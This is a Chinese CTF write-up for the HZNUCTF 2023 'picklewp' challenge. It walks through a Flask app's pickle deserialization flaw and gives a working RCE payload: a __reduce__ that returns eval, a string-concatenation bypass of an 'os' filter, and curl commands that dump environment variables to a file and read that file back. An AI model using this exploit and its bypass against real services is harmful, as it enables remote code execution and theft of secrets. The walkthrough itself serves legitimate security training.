---
date: 2026-11-17 18:10:00
slug: hznuctf2023-picklewp
categories:
  - Python
  - 反序列化
  - 代码审计
---

# [HZNUCTF 2023 preliminary] picklewp — 把命令结果写到文件，再换个名字读回来

> **题目类型**：Python 反序列化（pickle RCE）+ 关键词过滤绕过
>
> **Flag**：`NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}`

---

## 题目概述

进靶场直接给源码。**先把缩进换行整理一遍再读**——粘出来格式全乱了，`Shift+Alt+F` 走一下。

源码一共二十行，三个路由。

---

## 解题过程

### Step 1：读源码，两个点连起来看

```python
@app.route('/')
def index():
    with open('app.py', 'r') as f:
        return f.read()

@app.route('/calc', methods=['GET'])
def getflag():
    payload = request.args.get("payload")
    pickle.loads(base64.b64decode(payload).replace(b'os', b''))
    return "ganbadie!"

@app.route('/readFile', methods=['GET'])
def readFile():
    filename = request.args.get('filename').replace("flag", "?????")
    with open(filename, 'r') as f:
        return f.read()
```

**三个路由各司其职：**

```
/          直接把源码吐出来（等于免费给源码）
/calc      base64 解码 → pickle.loads → 反序列化执行
/readFile  读任意文件，但文件名里的 "flag" 会被替换成 "?????"
```

**所以这题的结构是：**

```
/calc 负责执行命令（把结果写到文件里）
/readFile 负责把文件读出来（但文件名不能带 flag）
```

**两个点必须连起来用——一个没有回显，另一个不能读带 flag 名字的文件。**

### Step 2：`/calc` 的过滤怎么绕

```python
pickle.loads(base64.b64decode(payload).replace(b'os', b''))
```

**注意执行顺序：先 base64 解码，**再**对解码出来的字节做 `os` 替换。**

**所以只要 payload 里出现连续的 `os`，就会被删掉——`pickle.loads` 直接炸。**

**绕过方式：字符串拼接。**

```python
'__import__("o" + "s").system("id")'
```

**在 pickle 的字节流里，`o` 和 `s` 是两个独立的字符，不会形成连续的 `os`；到运行时它们才拼成 `os`。**

**这是“过滤字符但是执行时拼接”的通用思路。**

### Step 3：构造 pickle payload

```python
class evil:
    def __reduce__(self):
        import os
        return (eval, ("__import__('o'+'s').system('env > x.txt')",))

new = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
print(urllib.parse.quote(new))
```

**三个要点：**

```
① __reduce__：反序列化时返回 (可调用对象, 参数) → 服务器执行 eval(...)
② 'o'+'s' 拼接：避开 replace(b'os', b'')
③ urllib.parse.quote：base64 里的 + 必须做 URL 编码
```

### Step 4：为什么 `+` 必须编码（这题卡最久的地方）

**base64 的字符集里包含 `+`，而 `+` 放在 URL 的 query 里会被解码成**空格**。**

**于是你发出去的是：**

```text
/calc?payload=gAN9cQAo...ab+cd...
```

**服务器收到的 `payload` 已经变成：**

```text
gAN9cQAo...ab cd...
```

**中间多了一个空格，base64 解码直接失败——而 `/calc` 成功时只返回 `ganbadie!`，失败时也没有明显报错，**看起来就像“没反应”**。**

**所以脚本最后一定要 `quote()`：**

```text
+  →  %2B
```

**这也是为什么用 `curl -G --data-urlencode` 更省事——它替你编码。**

### Step 5：第一次读到的“flag”是假的

**先 `cat /f*`，写进 `x.txt`，再用 `/readFile?filename=./x.txt` 读回来：**

```text
flagnothere
```

**是个干扰文件。**

**接着 `ls /`，根目录下只有一个 `flag.sh`——读出来也不是真的。**

**那就换方向：看环境变量。**

```python
"__import__('o'+'s').system('env > x.txt')"
```

**`/readFile?filename=./x.txt` 读回来，flag 在环境变量里：**

```text
NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}
```

---

| 关键点 | 说明 |
| --- | --- |
| `/calc` | `pickle.loads(b64decode(payload))` → 反序列化即执行 |
| 过滤 | `.replace(b'os', b'')` 作用在**解码后的字节**上 |
| 绕过 | `'o' + 's'` 拼接，字节流里不出现连续 `os` |
| `/readFile` | 文件名里的 `flag` 会被替换成 `?????` → 必须换个名字写 |
| 读写配合 | `/calc` 写文件、`/readFile` 读回来（无回显题的常规套路） |
| `+` 的坑 | base64 的 `+` 在 query 里会被当空格，必须 `quote()` |
| 假 flag | `flagnothere`、`/flag.sh` 都是干扰，真正的在环境变量 |

---

??? note "完整 payload"

    ```python
    import base64
    import pickle
    import urllib.parse

    class evil:
        def __reduce__(self):
            return (eval, ("__import__('o'+'s').system('env > x.txt')",))

    new = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
    print(urllib.parse.quote(new))
    ```

    ```powershell
    curl.exe -s -G --data-urlencode "payload=gAN9cQAo...（上面输出的结果）" "http://目标/calc"
    curl.exe -s -G --data-urlencode "filename=./x.txt" "http://目标/readFile"
    ```

??? note "这题踩的坑"

    **① `__import__['o'+'s']` 写成了下标**

    那是**函数调用**不是取下标，必须写 `__import__('o'+'s')`。写成方括号，eval 直接抛 TypeError，而 `/calc` 失败时页面没反馈，很难察觉。

    **② base64 的 `+` 没编码**

    query 里的 `+` → 空格 → base64 解码失败。**表现是“页面没反应”，不是报错。**这是这题最容易卡住的地方。

    **③ 想直接 `/readFile?filename=/flag`**

    源码里 `filename.replace("flag", "?????")`——**连路径里的 flag 都会被替换**。所以必须先把内容写到另一个名字的文件里（`x.txt`），再读那个文件。

    **④ 只在根目录找 flag**

    `cat /f*` 出来 `flagnothere`、`ls /` 只有一个 `flag.sh`。**真 flag 在环境变量里（`env`）。**
